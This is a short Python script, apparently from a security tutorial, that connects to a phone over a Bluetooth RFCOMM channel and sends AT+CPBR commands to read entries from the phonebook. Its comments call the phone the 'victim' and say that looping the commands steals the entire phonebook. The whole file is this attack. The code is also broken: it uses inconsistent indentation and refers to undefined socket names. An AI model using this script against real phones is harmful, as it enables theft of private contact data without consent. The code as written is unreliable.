#!/usr/bin/python
# -*- coding: utf-8 -*-
import bluetooth

tgtPhone = 'AA:BB:CC:DD:EE:FF'

port = 17
# Uses RFCOMM channel to issues AT commands  to remote control
# device
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))

for contact in range(1, 5):
    # Dumps the first contact in the victim phonebook, repeating
	# steals the entire phonebook
	atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print '[+] ' + str(contact) + ' : ' + result

sock.close()
